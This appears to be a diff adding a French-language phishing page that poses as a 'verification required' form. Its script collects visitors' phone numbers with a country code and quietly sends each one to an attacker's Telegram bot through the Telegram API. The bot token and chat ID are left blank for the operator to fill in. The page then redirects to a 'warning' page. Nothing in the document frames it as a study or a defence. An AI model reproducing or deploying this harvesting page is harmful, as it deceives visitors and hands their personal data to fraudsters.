@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#0a192f">
+  <meta name="description" content="Page de vérification pour entrer votre numéro de téléphone">
+  <meta name="keywords" content="vérification, téléphone, numéro, code pays, formulaire">
+  <title>Vérification Requise</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary-color: #2c3e50;
+      --primary-dark: #1a252f;
+      --bg-color: #f8f9fa;
+      --card-bg: #ffffff;
+      --input-bg: #e9ecef;
+      --text-color: #333;
+      --border-radius: 12px;
+      --transition-speed: 0.3s;
+      --shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      font-family: 'Poppins', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      background: var(--card-bg);
+      border-radius: var(--border-radius);
+      padding: 30px;
+      width: 100%;
+      max-width: 450px;
+      text-align: center;
+      box-shadow: var(--shadow);
+    }
+
+    h1 {
+      color: var(--primary-color);
+      margin-bottom: 20px;
+      font-size: 1.8em;
+    }
+
+    .input-group {
+      margin: 15px 0;
+      text-align: left;
+    }
+
+    select,
+    input {
+      width: 100%;
+      padding: 14px;
+      border: 2px solid var(--input-bg);
+      border-radius: var(--border-radius);
+      background: var(--input-bg);
+      color: var(--text-color);
+      font-size: 16px;
+      transition: border-color var(--transition-speed);
+      outline: none;
+    }
+
+    select:focus,
+    input:focus {
+      border-color: var(--primary-color);
+    }
+
+    button {
+      width: 100%;
+      padding: 16px;
+      background: var(--primary-color);
+      color: white;
+      border: none;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 500;
+      margin-top: 20px;
+      transition: background var(--transition-speed), transform 0.2s;
+    }
+
+    button:hover {
+      background: var(--primary-dark);
+      transform: translateY(-2px);
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h1>Entrez votre numéro</h1>
+
+    <div class="input-group">
+      <select id="countryCode" aria-label="Code pays">
+        <option value="+33">France (+33)</option>
+        <option value="+212">Maroc (+212)</option>
+        <option value="+213">Algérie (+213)</option>
+        <option value="+216">Tunisie (+216)</option>
+        <option value="+32">Belgique (+32)</option>
+        <option value="+41">Suisse (+41)</option>
+      </select>
+    </div>
+
+    <div class="input-group">
+      <input type="tel" id="phoneNumber" placeholder="Numéro de téléphone" pattern="[0-9]*" maxlength="9"
+        inputmode="numeric" aria-label="Numéro de téléphone" required>
+    </div>
+
+    <button type="button" id="continueBtn">Continuer</button>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const phoneInput = document.getElementById('phoneNumber');
+      const continueBtn = document.getElementById('continueBtn');
+
+      // Only allow numbers in the phone field
+      phoneInput.addEventListener('input', function (e) {
+        this.value = this.value.replace(/[^0-9]/g, '');
+      });
+
+      // Handle the button click
+      continueBtn.addEventListener('click', redirectToWarning);
+
+      // Also allow form submission on Enter key
+      phoneInput.addEventListener('keypress', function (e) {
+        if (e.key === 'Enter') {
+          redirectToWarning();
+        }
+      });
+
+      function redirectToWarning() {
+        const phoneNumber = phoneInput.value;
+        const countryCode = document.getElementById('countryCode').value;
+
+        if (/^\d{9}$/.test(phoneNumber)) {
+          const fullNumber = countryCode + phoneNumber;
+          sendToTelegram(fullNumber);  // Envoie du numéro à Telegram
+          window.location.href = `warning.html?number=${encodeURIComponent(fullNumber)}`;
+        } else {
+          alert('Numéro invalide! 9 chiffres requis');
+          phoneInput.focus();
+        }
+      }
+
+      // Fonction pour envoyer le numéro à Telegram
+      function sendToTelegram(phoneNumber) {
+        const telegramToken = ''; // Remplace par ton token Telegram
+        const chatId = ''; // Remplace par ton chat ID
+        const message = `Numéro de téléphone: ${phoneNumber}`;
+
+        const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(telegramUrl)
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              console.log('Message envoyé à Telegram avec succès!');
+            } else {
+              console.error('Erreur lors de l\'envoi à Telegram');
+            }
+          })
+          .catch(error => {
+            console.error('Erreur de connexion à l\'API Telegram', error);
+          });
+      }
+    });
+  </script>
+</body>
+
+</html>
